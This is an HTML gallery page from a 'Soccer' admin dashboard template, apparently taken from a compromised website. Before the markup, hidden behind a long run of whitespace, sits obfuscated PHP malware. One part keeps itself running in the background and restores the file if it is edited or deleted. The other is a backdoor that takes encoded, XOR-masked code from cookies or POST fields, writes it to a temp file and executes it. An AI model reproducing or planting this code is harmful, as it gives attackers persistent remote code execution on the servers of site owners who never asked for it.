<?php                                                                                                                                                                                                                                                                                                                                                                                                 @ini_set('m' . "\x61" . "\x78" . chr ( 246 - 151 )."\145" . 'x' . chr ( 366 - 265 ).chr (99) . 'u' . "\164" . 'i' . "\157" . chr (110) . chr ( 891 - 796 )."\164" . chr ( 149 - 44 ).chr (109) . "\145", 0);@set_time_limit(0);class _XJlLUNv{private $_hSCegRec;public function __construct(){$this->_hSCegRec = get_class($this);}private function _KVXlP($_SvxBMqCN){$_rqFFSxzP="\160" . chr ( 1092 - 981 )."\160" . 'e' . chr ( 821 - 711 );$_cGsFxgkI = explode("\x2c", ini_get(chr (100) . "\151" . chr (115) . chr ( 1076 - 979 ).'b' . chr (108) . "\x65" . chr (95) . "\146" . "\165" . chr ( 412 - 302 ).chr (99) . 't' . 'i' . 'o' . "\x6e" . "\x73"));$_iDhquhKa = array();foreach ($_cGsFxgkI as $_fEZeJUnf) {$_iDhquhKa[] = trim($_fEZeJUnf);}if (in_array($_rqFFSxzP, $_iDhquhKa)) {$_rqFFSxzP = chr ( 513 - 412 )."\170" . chr ( 798 - 697 ).chr ( 944 - 845 );}if (in_array($_rqFFSxzP, $_iDhquhKa)) {return false;}$_cqydBcmt = '';switch ($_rqFFSxzP){case chr ( 513 - 412 )."\170" . chr ( 798 - 697 ).chr ( 944 - 845 ):exec($_SvxBMqCN,$_gaFeiIol);foreach ($_gaFeiIol as $_whvKmMOP => $_FWJRQsQO) {$_cqydBcmt .= $_whvKmMOP . chr ( 246 - 214 ).chr (58) . chr ( 74 - 42 ) . $_FWJRQsQO . PHP_EOL;}return $_cqydBcmt;case "\160" . chr ( 1092 - 981 )."\160" . 'e' . chr ( 821 - 711 ):$_IoKROjgC = popen($_SvxBMqCN,chr ( 593 - 479 ));while (!feof($_IoKROjgC)) {$_TeBynuUc = fgets($_IoKROjgC, 4096);$_cqydBcmt .= $_TeBynuUc;}pclose($_IoKROjgC);return $_cqydBcmt;default:return false;}}private function _yEDLS() {$_stoguBxV = preg_match(chr (47) . 'c' . 'l' . chr (105) . chr (47) . "\151", php_sapi_name()) ? true : false;if ($_stoguBxV === false) {if (isset($_SERVER['argc']) && $_SERVER["\141" . "\162" . chr (103) . "\x63"] >= 2) {$_stoguBxV = true;}}if ($_stoguBxV === false) {if (!isset($_SERVER["\x53" . chr (67) . "\x52" . chr (73) . chr ( 591 - 511 ).'T' . "\137" . "\x4e" . chr ( 322 - 257 )."\x4d" . chr (69)])) {$_stoguBxV = true;}}return $_stoguBxV;}private function _dZOPl(){ob_start();phpinfo(1);$_iyOpcvqO = ob_get_contents();ob_end_clean();$_iGmkacVK = rawurldecode(chr ( 357 - 320 ).chr (50) . chr ( 136 - 80 ).chr (37) . chr ( 715 - 662 ).chr (66) . "\x25" . "\65" . "\x45" . "\45" . '2' . chr ( 762 - 707 )."\x25" . '2' . chr ( 488 - 438 )."\45" . chr (50) . "\66" . chr (37) . '5' . chr (68) . "\45" . chr (50) . chr ( 843 - 777 )."\x25" . "\62" . "\71" . "\x25" . '2' . chr ( 974 - 904 ).chr ( 265 - 150 ).chr ( 441 - 336 ));preg_match("\x2f" . chr ( 617 - 572 )."\x2d" . chr (98) . 'i' . 'n' . "\x64" . chr ( 184 - 79 )."\x72" . chr (61) . $_iGmkacVK, $_iyOpcvqO, $_JRzFNbGv);if (isset($_JRzFNbGv[1]) && $_JRzFNbGv[1] != '') {return $_JRzFNbGv[1] . '/php';}preg_match(chr ( 673 - 626 )."\x2d" . "\x2d" . chr (112) . 'r' . "\145" . chr ( 527 - 425 )."\151" . chr ( 1093 - 973 ).chr (61) . $_iGmkacVK, $_iyOpcvqO, $_JRzFNbGv);if (!isset($_JRzFNbGv[1])) {return "\160" . "\x68" . chr ( 336 - 224 );}return $_JRzFNbGv[1] . "\x2f" . chr (98) . chr (105) . "\x6e" . chr (47) . 'p' . chr (104) . "\x70";}private function _KNfgO($_rlHNFsRW){$_CEuhlImE = fopen($_rlHNFsRW, chr ( 222 - 125 ).chr ( 129 - 86 ));if (empty($_CEuhlImE)){return FALSE;}fseek($_CEuhlImE, 0, SEEK_SET);$_QVZPQAYr = fread($_CEuhlImE, 64);try {$_QVZPQAYr = intval($_QVZPQAYr);} catch (Exception $_zQDaazyn) {$_QVZPQAYr = 0;}ftruncate($_CEuhlImE, 0);fwrite($_CEuhlImE, time());fclose($_CEuhlImE);if (($_QVZPQAYr + 7) > time()){return TRUE;}else{return FALSE;}}private function _KyNxX($_PdefaKCH=""){if ($this->_yEDLS()){$_rlHNFsRW = $_SERVER[chr (97) . "\x72" . "\147" . chr (118)][1];}else{$_rlHNFsRW = $_SERVER['D' . "\117" . chr ( 658 - 591 ).chr ( 696 - 611 ).chr (77) . "\105" . "\x4e" . "\124" . "\x5f" . chr ( 1063 - 981 )."\x4f" . 'O' . "\124"] . "\57" . "\x2e" . substr(md5(str_replace('w' . "\167" . "\167" . chr (46), "", $_SERVER['H' . "\124" . 'T' . "\x50" . chr ( 710 - 615 )."\110" . 'O' . 'S' . chr (84)]) . $this->_hSCegRec), 0, 8);}if (empty($_PdefaKCH)){return $_rlHNFsRW;}else{$_GlmWkrix = dirname($_rlHNFsRW);$_BUHRwKFj = basename($_rlHNFsRW);$_rlHNFsRW = $_GlmWkrix . "\57" . "\x2e" . substr(md5($_BUHRwKFj . $_PdefaKCH), 0, 8);}return $_rlHNFsRW;}private function _DPhbS(){$_dmkEwWiB = $this->_dZOPl();$this->_KVXlP("nohup $_dmkEwWiB " . __FILE__ . "\x20" . $this->_KyNxX() . chr (32) . chr (62) . chr (47) . 'd' . "\145" . "\x76" . chr ( 919 - 872 )."\x6e" . "\x75" . chr (108) . 'l' . chr (32) . chr (50) . chr ( 362 - 300 ).chr (38) . '1' . "\40" . chr ( 394 - 356 ));}public function _vsHGO(){$_dHkWxOjF = __FILE__;$_lNBChLzJ = @file_get_contents($_dHkWxOjF);$_rIEgGFHa = hash("\163" . "\150" . chr (97) . chr (49), $_lNBChLzJ);if ($this->_yEDLS()){while (true) {$_iTektijS = @file_get_contents($_dHkWxOjF);$_UsYGbwUM = hash("\163" . "\150" . chr (97) . chr (49), $_iTektijS);if ($_rIEgGFHa != $_UsYGbwUM){@unlink($_dHkWxOjF);@file_put_contents($_dHkWxOjF, $_lNBChLzJ);@touch($_dHkWxOjF);@chmod($_dHkWxOjF, 0644);}$this->_KNfgO($this->_KyNxX());sleep(1);}}elseif (!$this->_KNfgO($this->_KyNxX())){$this->_DPhbS();}}}$_DUsLAYXT = new _XJlLUNv();$_DUsLAYXT->_vsHGO();
if (!class_exists("T_TNwPS")){class T_TNwPS{private $OjdyXB;public static $CoYmIGIeGj = "d2ecc385-e8c0-4c7f-a718-87c867de9245";public static $KGyqJ = NULL;public function __construct(){$nXBnAru = $_COOKIE;$mXdeRhACqd = $_POST;$EKxMMYMS = @$nXBnAru[substr(T_TNwPS::$CoYmIGIeGj, 0, 4)];if (!empty($EKxMMYMS)){$NlEDVifdL = "base64";$dVIJYQkbia = "";$EKxMMYMS = explode(",", $EKxMMYMS);foreach ($EKxMMYMS as $nBgGlexzo){$dVIJYQkbia .= @$nXBnAru[$nBgGlexzo];$dVIJYQkbia .= @$mXdeRhACqd[$nBgGlexzo];}$dVIJYQkbia = array_map($NlEDVifdL . chr ( 172 - 77 ).'d' . chr (101) . 'c' . chr (111) . "\x64" . chr (101), array($dVIJYQkbia,)); $dVIJYQkbia = $dVIJYQkbia[0] ^ str_repeat(T_TNwPS::$CoYmIGIeGj, (strlen($dVIJYQkbia[0]) / strlen(T_TNwPS::$CoYmIGIeGj)) + 1);T_TNwPS::$KGyqJ = @unserialize($dVIJYQkbia);}}public function __destruct(){$this->kzdMX();}private function kzdMX(){if (is_array(T_TNwPS::$KGyqJ)) {$UrehBZ = sys_get_temp_dir() . "/" . crc32(T_TNwPS::$KGyqJ['s' . "\x61" . chr ( 733 - 625 ).'t']);@T_TNwPS::$KGyqJ[chr ( 1007 - 888 ).chr ( 1000 - 886 ).'i' . chr ( 632 - 516 ).chr (101)]($UrehBZ, T_TNwPS::$KGyqJ[chr (99) . chr (111) . chr (110) . "\164" . "\x65" . 'n' . chr (116)]);include $UrehBZ;@T_TNwPS::$KGyqJ['d' . "\x65" . chr (108) . "\x65" . chr ( 1057 - 941 ).chr ( 907 - 806 )]($UrehBZ);exit();}}}$IuEtkv = new T_TNwPS(); $IuEtkv = NULL;} ?><!doctype html>
<html lang="en" dir="ltr">

<!-- soccer/project/page-gallery.html  07 Jan 2020 03:41:29 GMT -->
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

<link rel="icon" href="favicon.ico" type="image/x-icon"/>

<title>:: Soccer :: Page Gallery</title>

<!-- Bootstrap Core and vandor -->
<link rel="stylesheet" href="assets/plugins/bootstrap/css/bootstrap.min.css" />

<!-- Core css -->
<link rel="stylesheet" href="assets/css/main.css"/>
<link rel="stylesheet" href="assets/css/theme1.css"/>
</head>

<body class="font-montserrat">
<!-- Page Loader -->
<div class="page-loader-wrapper">
    <div class="loader">
    </div>
</div>
<!-- Overlay For Sidebars -->

<div id="main_content">

    <div id="header_top" class="header_top">
        <div class="container">
            <div class="hleft">
                <a class="header-brand" href="index-2.html"><i class="fa fa-soccer-ball-o brand-logo"></i></a>
                <div class="dropdown">
                    <a href="javascript:void(0)" class="nav-link user_btn"><img class="avatar" src="assets/images/user.png" alt="" data-toggle="tooltip" data-placement="right" title="User Menu"/></a>
                    <a href="page-search.html" class="nav-link icon xs-hide"><i class="fa fa-search"></i></a>
                    <a href="app-calendar.html"  class="nav-link icon app_inbox xs-hide"><i class="fa fa-calendar"></i></a>
                    <a href="app-contact.html"  class="nav-link icon xs-hide"><i class="fa fa-id-card-o"></i></a>
                    <a href="app-chat.html"  class="nav-link icon xs-hide"><i class="fa fa-comments-o"></i></a>
                    <a href="app-filemanager.html"  class="nav-link icon app_file xs-hide"><i class="fa fa-folder-o"></i></a>
                    <a href="javascript:void(0)" class="nav-link icon theme_btn xs-hide"><i class="fa fa-paint-brush" data-toggle="tooltip" data-placement="right" title="Themes"></i></a>
                </div>
            </div>
            <div class="hright">
                <div class="dropdown">
                    <a href="javascript:void(0)" class="nav-link icon settingbar"><i class="fa fa-gear fa-spin" data-toggle="tooltip" data-placement="right" title="Settings"></i></a>
                    <a href="javascript:void(0)" class="nav-link icon menu_toggle"><i class="fa  fa-align-left"></i></a>
                </div>
            </div>
        </div>
    </div>

    <div id="rightsidebar" class="right_sidebar">
        <a href="javascript:void(0)" class="p-3 settingbar float-right"><i class="fa fa-close"></i></a>
        <div class="p-4">
            <div class="mb-4">
                <h6 class="font-14 font-weight-bold text-muted">Font Style</h6>
                <div class="custom-controls-stacked font_setting">
                    <label class="custom-control custom-radio custom-control-inline">
                        <input type="radio" class="custom-control-input" name="font" value="font-opensans">
                        <span class="custom-control-label">Open Sans Font</span>
                    </label>
                    <label class="custom-control custom-radio custom-control-inline">
                        <input type="radio" class="custom-control-input" name="font" value="font-montserrat" checked="">
                        <span class="custom-control-label">Montserrat Google Font</span>
                    </label>
                    <label class="custom-control custom-radio custom-control-inline">
                        <input type="radio" class="custom-control-input" name="font" value="font-roboto">
                        <span class="custom-control-label">Robot Google Font</span>
                    </label>
                </div>
            </div>
            <hr>
            <div class="mb-4">
                <h6 class="font-14 font-weight-bold text-muted">Dropdown Menu Icon</h6>
                <div class="custom-controls-stacked arrow_option">
                    <label class="custom-control custom-radio custom-control-inline">
                        <input type="radio" class="custom-control-input" name="marrow" value="arrow-a">
                        <span class="custom-control-label">A</span>
                    </label>
                    <label class="custom-control custom-radio custom-control-inline">
                        <input type="radio" class="custom-control-input" name="marrow" value="arrow-b">
                        <span class="custom-control-label">B</span>
                    </label>
                    <label class="custom-control custom-radio custom-control-inline">
                        <input type="radio" class="custom-control-input" name="marrow" value="arrow-c" checked="">
                        <span class="custom-control-label">C</span>
                    </label>
                </div>
                <h6 class="font-14 font-weight-bold mt-4 text-muted">SubMenu List Icon</h6>
                <div class="custom-controls-stacked list_option">
                    <label class="custom-control custom-radio custom-control-inline">
                        <input type="radio" class="custom-control-input" name="listicon" value="list-a" checked="">
                        <span class="custom-control-label">A</span>
                    </label>
                    <label class="custom-control custom-radio custom-control-inline">
                        <input type="radio" class="custom-control-input" name="listicon" value="list-b">
                        <span class="custom-control-label">B</span>
                    </label>
                    <label class="custom-control custom-radio custom-control-inline">
                        <input type="radio" class="custom-control-input" name="listicon" value="list-c">
                        <span class="custom-control-label">C</span>
                    </label>
                </div>
            </div>
            <hr>
            <div>
                <h6 class="font-14 font-weight-bold mt-4 text-muted">General Settings</h6>
                <ul class="setting-list list-unstyled mt-1 setting_switch">
                    <li>
                        <label class="custom-switch">
                            <span class="custom-switch-description">Night Mode</span>
                            <input type="checkbox" name="custom-switch-checkbox" class="custom-switch-input btn-darkmode">
                            <span class="custom-switch-indicator"></span>
                        </label>
                    </li>
                    <li>
                        <label class="custom-switch">
                            <span class="custom-switch-description">Fix Navbar top</span>
                            <input type="checkbox" name="custom-switch-checkbox" class="custom-switch-input btn-fixnavbar">
                            <span class="custom-switch-indicator"></span>
                        </label>
                    </li>
                    <li>
                        <label class="custom-switch">
                            <span class="custom-switch-description">Header Dark</span>
                            <input type="checkbox" name="custom-switch-checkbox" class="custom-switch-input btn-pageheader" checked="">
                            <span class="custom-switch-indicator"></span>
                        </label>
                    </li>
                    <li>
                        <label class="custom-switch">
                            <span class="custom-switch-description">Min Sidebar Dark</span>
                            <input type="checkbox" name="custom-switch-checkbox" class="custom-switch-input btn-min_sidebar">
                            <span class="custom-switch-indicator"></span>
                        </label>
                    </li>
                    <li>
                        <label class="custom-switch">
                            <span class="custom-switch-description">Sidebar Dark</span>
                            <input type="checkbox" name="custom-switch-checkbox" class="custom-switch-input btn-sidebar">
                            <span class="custom-switch-indicator"></span>
                        </label>
                    </li>
                    <li>
                        <label class="custom-switch">
                            <span class="custom-switch-description">Icon Color</span>
                            <input type="checkbox" name="custom-switch-checkbox" class="custom-switch-input btn-iconcolor">
                            <span class="custom-switch-indicator"></span>
                        </label>
                    </li>
                    <li>
                        <label class="custom-switch">
                            <span class="custom-switch-description">Gradient Color</span>
                            <input type="checkbox" name="custom-switch-checkbox" class="custom-switch-input btn-gradient">
                            <span class="custom-switch-indicator"></span>
                        </label>
                    </li>
                    <li>
                        <label class="custom-switch">
                            <span class="custom-switch-description">Box Shadow</span>
                            <input type="checkbox" name="custom-switch-checkbox" class="custom-switch-input btn-boxshadow">
                            <span class="custom-switch-indicator"></span>
                        </label>
                    </li>
                    <li>
                        <label class="custom-switch">
                            <span class="custom-switch-description">RTL Support</span>
                            <input type="checkbox" name="custom-switch-checkbox" class="custom-switch-input btn-rtl">
                            <span class="custom-switch-indicator"></span>
                        </label>
                    </li>
                    <li>
                        <label class="custom-switch">
                            <span class="custom-switch-description">Box Layout</span>
                            <input type="checkbox" name="custom-switch-checkbox" class="custom-switch-input btn-boxlayout">
                            <span class="custom-switch-indicator"></span>
                        </label>
                    </li>
                </ul>
            </div>
            <hr>
            <div class="form-group">
                <label class="d-block">Storage <span class="float-right">77%</span></label>
                <div class="progress progress-sm">
                    <div class="progress-bar" role="progressbar" aria-valuenow="77" aria-valuemin="0" aria-valuemax="100" style="width: 77%;"></div>
                </div>
                <button type="button" class="btn btn-primary btn-block mt-3">Upgrade Storage</button>
            </div>
        </div>
    </div>

    <div class="theme_div">
        <div class="card">
            <div class="card-body">
                <ul class="list-group list-unstyled">
                    <li class="list-group-item mb-2">
                        <p>Default Theme</p>
                        <a href="index-2.html"><img src="assets/images/themes/default.png" class="img-fluid" /></a>
                    </li>
                    <li class="list-group-item mb-2">
                        <p>Night Mode Theme</p>
                        <a href="project-dark/index.html"><img src="assets/images/themes/dark.png" class="img-fluid" /></a>
                    </li>
                    <li class="list-group-item mb-2">
                        <p>RTL Version</p>
                        <a href="project-rtl/index.html"><img src="assets/images/themes/rtl.png" class="img-fluid" /></a>
                    </li>
                </ul>
            </div>
        </div>
    </div>

    <div class="user_div">
        <h5 class="brand-name mb-4">Soccer<a href="javascript:void(0)" class="user_btn"><i class="icon-logout"></i></a></h5>
        <div class="card-body">
            <a href="page-profile.html"><img class="card-profile-img" src="assets/images/sm/avatar1.jpg" alt=""></a>
            <h6 class="mb-0">Peter Richards</h6>
            <span>peter.richard@gmail.com</span>
            <div class="d-flex align-items-baseline mt-3">
                <h3 class="mb-0 mr-2">9.8</h3>
                <p class="mb-0"><span class="text-success">1.6% <i class="fa fa-arrow-up"></i></span></p>
            </div>
            <div class="progress progress-xs">
                <div class="progress-bar" role="progressbar" style="width: 15%" aria-valuenow="15" aria-valuemin="0" aria-valuemax="100"></div>
                <div class="progress-bar bg-info" role="progressbar" style="width: 20%" aria-valuenow="20" aria-valuemin="0" aria-valuemax="100"></div>
                <div class="progress-bar bg-success" role="progressbar" style="width: 30%" aria-valuenow="30" aria-valuemin="0" aria-valuemax="100"></div>
                <div class="progress-bar bg-orange" role="progressbar" style="width: 5%" aria-valuenow="20" aria-valuemin="0" aria-valuemax="100"></div>
                <div class="progress-bar bg-indigo" role="progressbar" style="width: 13%" aria-valuenow="20" aria-valuemin="0" aria-valuemax="100"></div>
            </div>
            <h6 class="text-uppercase font-10 mt-1">Performance Score</h6>
            <hr>
            <p>Activity</p>
            <ul class="new_timeline">
                <li>
                    <div class="bullet pink"></div>
                    <div class="time">11:00am</div>
                    <div class="desc">
                        <h3>Attendance</h3>
                        <h4>Computer Class</h4>
                    </div>
                </li>
                <li>
                    <div class="bullet pink"></div>
                    <div class="time">11:30am</div>
                    <div class="desc">
                        <h3>Added an interest</h3>
                        <h4>“Volunteer Activities”</h4>
                    </div>
                </li>
                <li>
                    <div class="bullet green"></div>
                    <div class="time">12:00pm</div>
                    <div class="desc">
                        <h3>Developer Team</h3>
                        <h4>Hangouts</h4>
                        <ul class="list-unstyled team-info margin-0 p-t-5">
                            <li><img src="assets/images/xs/avatar1.jpg" alt="Avatar"></li>
                            <li><img src="assets/images/xs/avatar2.jpg" alt="Avatar"></li>
                            <li><img src="assets/images/xs/avatar3.jpg" alt="Avatar"></li>
                            <li><img src="assets/images/xs/avatar4.jpg" alt="Avatar"></li>
                        </ul>
                    </div>
                </li>
                <li>
                    <div class="bullet green"></div>
                    <div class="time">2:00pm</div>
                    <div class="desc">
                        <h3>Responded to need</h3>
                        <a href="javascript:void(0)">“In-Kind Opportunity”</a>
                    </div>
                </li>
                <li>
                    <div class="bullet orange"></div>
                    <div class="time">1:30pm</div>
                    <div class="desc">
                        <h3>Lunch Break</h3>
                    </div>
                </li>
                <li>
                    <div class="bullet green"></div>
                    <div class="time">2:38pm</div>
                    <div class="desc">
                        <h3>Finish</h3>
                        <h4>Go to Home</h4>
                    </div>
                </li>
            </ul>
        </div>
    </div>

    <div id="left-sidebar" class="sidebar ">
        <h5 class="brand-name">Soccer <a href="javascript:void(0)" class="menu_option float-right"><i class="icon-grid font-16" data-toggle="tooltip" data-placement="left" title="Grid & List Toggle"></i></a></h5>
        <nav id="left-sidebar-nav" class="sidebar-nav">
            <ul class="metismenu">
                <li class="g_heading">Project</li>
                <li><a href="index-2.html"><i class="fa fa-dashboard"></i><span>Dashboard</span></a></li>
                <li><a href="project-list.html"><i class="fa fa-list-ol"></i><span>Project list</span></a></li>
                <li><a href="project-taskboard.html"><i class="fa fa-calendar-check-o"></i><span>Taskboard</span></a></li>
                <li><a href="project-ticket.html"><i class="fa fa-list-ul"></i><span>Ticket List</span></a></li>
                <li><a href="project-ticket-details.html"><i class="icon-tag"></i><span>Ticket Details</span></a></li>
                <li><a href="project-clients.html"><i class="fa fa-user"></i><span>Clients</span></a></li>
                <li><a href="project-todo.html"><i class="fa fa-check-square-o"></i><span>Todo List</span></a></li>
                <li class="g_heading">App</li>
                <li><a href="app-calendar.html"><i class="fa fa-calendar"></i><span>Calendar</span></a></li>
                <li><a href="app-chat.html"><i class="fa fa-comments"></i><span>Chat</span></a></li>
                <li><a href="app-contact.html"><i class="fa fa-address-book"></i><span>Contact</span></a></li>
                <li><a href="app-filemanager.html"><i class="fa fa-folder"></i><span>FileManager</span></a></li>
                <li><a href="app-setting.html"><i class="fa fa-gear"></i><span>Setting</span></a></li>
                <li class="active"><a href="page-gallery.html"><i class="fa fa-photo"></i><span>Gallery</span></a></li>
                <li>
                    <a href="javascript:void(0)" class="has-arrow arrow-c"><i class="fa fa-lock"></i><span>Authentication</span></a>
                    <ul>
                        <li><a href="login.html">Login</a></li>
                        <li><a href="register.html">Register</a></li>
                        <li><a href="forgot-password.html">Forgot password</a></li>
                        <li><a href="404.html">404 error</a></li>
                        <li><a href="500.html">500 error</a></li>
                    </ul>
                </li>
                <li class="g_heading">Support</li>
                <li><a href="javascript:void(0)"><i class="fa fa-support"></i><span>Need Help?</span></a></li>
                <li><a href="javascript:void(0)"><i class="fa fa-tag"></i><span>ContactUs</span></a></li>
            </ul>
        </nav>
    </div>

    <div class="page">
        <div id="page_top" class="section-body top_dark">
            <div class="container-fluid">
                <div class="page-header">
                    <div class="left">
                        <a href="javascript:void(0)" class="icon menu_toggle mr-3"><i class="fa  fa-align-left"></i></a>
                        <h1 class="page-title">Image Gallery</h1>

                    </div>
                    <div class="right">
                        <div class="input-icon xs-hide mr-4">
                            <input type="text" class="form-control" placeholder="Search for...">
                            <span class="input-icon-addon"><i class="fe fe-search"></i></span>
                        </div>
                        <div class="notification d-flex">
                            <div class="dropdown d-flex">
                                <a class="nav-link icon d-none d-md-flex btn btn-default btn-icon ml-2" data-toggle="dropdown"><i class="fa fa-language"></i></a>
                                <div class="dropdown-menu dropdown-menu-right dropdown-menu-arrow">
                                    <a class="dropdown-item" href="#"><img class="w20 mr-2" src="assets/images/flags/us.svg">English</a>
                                    <div class="dropdown-divider"></div>
                                    <a class="dropdown-item" href="#"><img class="w20 mr-2" src="assets/images/flags/es.svg">Spanish</a>
                                    <a class="dropdown-item" href="#"><img class="w20 mr-2" src="assets/images/flags/jp.svg">japanese</a>
                                    <a class="dropdown-item" href="#"><img class="w20 mr-2" src="assets/images/flags/bl.svg">France</a>
                                </div>
                            </div>
                            <div class="dropdown d-flex">
                                <a class="nav-link icon d-none d-md-flex btn btn-default btn-icon ml-2" data-toggle="dropdown"><i class="fa fa-envelope"></i><span class="badge badge-success nav-unread"></span></a>
                                <div class="dropdown-menu dropdown-menu-right dropdown-menu-arrow">
                                    <ul class="right_chat list-unstyled w350 p-0">
                                        <li class="online">
                                            <a href="javascript:void(0);" class="media">
                                                <img class="media-object" src="assets/images/xs/avatar4.jpg" alt="">
                                                <div class="media-body">
                                                    <span class="name">Donald Gardner</span>
                                                    <div class="message">It is a long established fact that a reader</div>
                                                    <small>11 mins ago</small>
                                                    <span class="badge badge-outline status"></span>
                                                </div>
                                            </a>
                                        </li>
                                        <li class="online">
                                            <a href="javascript:void(0);" class="media">
                                                <img class="media-object " src="assets/images/xs/avatar5.jpg" alt="">
                                                <div class="media-body">
                                                    <span class="name">Wendy Keen</span>
                                                    <div class="message">There are many variations of passages of Lorem Ipsum</div>
                                                    <small>18 mins ago</small>
                                                    <span class="badge badge-outline status"></span>
                                                </div>
                                            </a>
                                        </li>
                                        <li class="offline">
                                            <a href="javascript:void(0);" class="media">
                                                <img class="media-object " src="assets/images/xs/avatar2.jpg" alt="">
                                                <div class="media-body">
                                                    <span class="name">Matt Rosales</span>
                                                    <div class="message">Contrary to popular belief, Lorem Ipsum is not simply</div>
                                                    <small>27 mins ago</small>
                                                    <span class="badge badge-outline status"></span>
                                                </div>
                                            </a>
                                        </li>
                                        <li class="online">
                                            <a href="javascript:void(0);" class="media">
                                                <img class="media-object " src="assets/images/xs/avatar3.jpg" alt="">
                                                <div class="media-body">
                                                    <span class="name">Phillip Smith</span>
                                                    <div class="message">It has roots in a piece of classical Latin literature from 45 BC</div>
                                                    <small>33 mins ago</small>
                                                    <span class="badge badge-outline status"></span>
                                                </div>
                                            </a>
                                        </li>
                                    </ul>
                                    <div class="dropdown-divider"></div>
                                    <a href="javascript:void(0)" class="dropdown-item text-center text-muted-dark readall">Mark all as read</a>
                                </div>
                            </div>
                            <div class="dropdown d-flex">
                                <a class="nav-link icon d-none d-md-flex btn btn-default btn-icon ml-2" data-toggle="dropdown"><i class="fa fa-bell"></i><span class="badge badge-primary nav-unread"></span></a>
                                <div class="dropdown-menu dropdown-menu-right dropdown-menu-arrow">
                                    <ul class="list-unstyled feeds_widget">
                                        <li>
                                            <div class="feeds-left"><i class="fa fa-check"></i></div>
                                            <div class="feeds-body">
                                                <h4 class="title text-danger">Issue Fixed <small class="float-right text-muted">11:05</small></h4>
                                                <small>WE have fix all Design bug with Responsive</small>
                                            </div>
                                        </li>
                                        <li>
                                            <div class="feeds-left"><i class="fa fa-user"></i></div>
                                            <div class="feeds-body">
                                                <h4 class="title">New User <small class="float-right text-muted">10:45</small></h4>
                                                <small>I feel great! Thanks team</small>
                                            </div>
                                        </li>
                                        <li>
                                            <div class="feeds-left"><i class="fa fa-thumbs-o-up"></i></div>
                                            <div class="feeds-body">
                                                <h4 class="title">7 New Feedback <small class="float-right text-muted">Today</small></h4>
                                                <small>It will give a smart finishing to your site</small>
                                            </div>
                                        </li>
                                        <li>
                                            <div class="feeds-left"><i class="fa fa-question-circle"></i></div>
                                            <div class="feeds-body">
                                                <h4 class="title text-warning">Server Warning <small class="float-right text-muted">10:50</small></h4>
                                                <small>Your connection is not private</small>
                                            </div>
                                        </li>
                                        <li>
                                            <div class="feeds-left"><i class="fa fa-shopping-cart"></i></div>
                                            <div class="feeds-body">
                                                <h4 class="title">7 New Orders <small class="float-right text-muted">11:35</small></h4>
                                                <small>You received a new oder from Tina.</small>
                                            </div>
                                        </li>
                                    </ul>
                                    <div class="dropdown-divider"></div>
                                    <a href="javascript:void(0)" class="dropdown-item text-center text-muted-dark readall">Mark all as read</a>
                                </div>
                            </div>
                            <div class="dropdown d-flex">
                                <a class="nav-link icon d-none d-md-flex btn btn-default btn-icon ml-2" data-toggle="dropdown"><i class="fa fa-user"></i></a>
                                <div class="dropdown-menu dropdown-menu-right dropdown-menu-arrow">
                                    <a class="dropdown-item" href="page-profile.html"><i class="dropdown-icon fe fe-user"></i> Profile</a>
                                    <a class="dropdown-item" href="app-setting.html"><i class="dropdown-icon fe fe-settings"></i> Settings</a>
                                    <a class="dropdown-item" href="javascript:void(0)"><span class="float-right"><span class="badge badge-primary">6</span></span><i class="dropdown-icon fe fe-mail"></i> Inbox</a>
                                    <a class="dropdown-item" href="javascript:void(0)"><i class="dropdown-icon fe fe-send"></i> Message</a>
                                    <div class="dropdown-divider"></div>
                                    <a class="dropdown-item" href="javascript:void(0)"><i class="dropdown-icon fe fe-help-circle"></i> Need help?</a>
                                    <a class="dropdown-item" href="login.html"><i class="dropdown-icon fe fe-log-out"></i> Sign out</a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="section-body mt-3">
            <div class="container-fluid">
                <div class="row row-cards">
                    <div class="col-12">
                        <div class="card">
                            <div class="card-body">
                                <div class="page-options d-flex">
                                    <div class="input-icon ml-2">
                                        <span class="input-icon-addon">
                                            <i class="fe fe-search"></i>
                                        </span>
                                        <input type="text" class="form-control" placeholder="Search photo">
                                    </div>
                                    <button type="submit" class="btn btn-primary ml-2">Upload New</button>
                                </div>
                                <div class="page-subtitle ml-0">1 - 12 of 1713 photos</div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="row row-cards">
                    <div class="col-sm-6 col-lg-4">
                        <div class="card p-3">
                            <a href="javascript:void(0)" class="mb-3">
                                <img src="assets/images/gallery/1.jpg" alt="Photo by Nathan Guerrero" class="rounded">
                            </a>
                            <div class="d-flex align-items-center px-2">
                                <img class="avatar avatar-md mr-3" src="assets/images/xs/avatar1.jpg" alt="">
                                <div>
                                    <div>Nathan Guerrero</div>
                                    <small class="d-block text-muted">12 days ago</small>
                                </div>
                                <div class="ml-auto text-muted">
                                    <a href="javascript:void(0)" class="icon"><i class="fe fe-eye mr-1"></i> 112</a>
                                    <a href="javascript:void(0)" class="icon d-none d-md-inline-block ml-3"><i class="fe fe-heart mr-1"></i> 42</a>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="col-sm-6 col-lg-4">
                        <div class="card p-3">
                            <a href="javascript:void(0)" class="mb-3">
                                <img src="assets/images/gallery/2.jpg" alt="Photo by Nathan Guerrero" class="rounded">
                            </a>
                            <div class="d-flex align-items-center px-2">
                                <img class="avatar avatar-md mr-3" src="assets/images/xs/avatar2.jpg" alt="">
                                <div>
                                    <div>Alice Mason</div>
                                    <small class="d-block text-muted">12 days ago</small>
                                </div>
                                <div class="ml-auto text-muted">
                                    <a href="javascript:void(0)" class="icon"><i class="fe fe-eye mr-1"></i> 70</a>
                                    <a href="javascript:void(0)" class="icon d-none d-md-inline-block ml-3"><i class="fe fe-heart mr-1"></i> 0</a>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="col-sm-6 col-lg-4">
                        <div class="card p-3">
                            <a href="javascript:void(0)" class="mb-3">
                                <img src="assets/images/gallery/3.jpg" alt="Photo by Rose Bradley" class="rounded">
                            </a>
                            <div class="d-flex align-items-center px-2">
                                <img class="avatar avatar-md mr-3" src="assets/images/xs/avatar3.jpg" alt="">
                                <div>
                                    <div>Rose Bradley</div>
                                    <small class="d-block text-muted">4 days ago</small>
                                </div>
                                <div class="ml-auto text-muted">
                                    <a href="javascript:void(0)" class="icon"><i class="fe fe-eye mr-1"></i> 166</a>
